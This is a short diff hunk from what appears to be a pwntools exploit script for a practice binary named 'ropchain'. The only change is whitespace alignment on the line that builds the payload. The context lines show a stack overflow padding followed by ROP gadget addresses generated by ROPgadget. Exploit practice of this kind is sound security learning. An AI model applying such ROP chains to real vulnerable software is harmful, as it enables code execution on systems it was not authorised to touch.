@@ -4,7 +4,7 @@ from struct import pack
 proc = process('./ropchain')
 
 # ROPgadget --binary ./ropchain --ropchain
-p = b'a' * (0x20 + 8)
+p  = b'a' * (0x20 + 8)
 p += pack('<Q', 0x000000000040a30d) # pop rsi ; ret
 p += pack('<Q', 0x000000000049d0c0) # @ .data
 p += pack('<Q', 0x0000000000419a1c) # pop rax ; ret
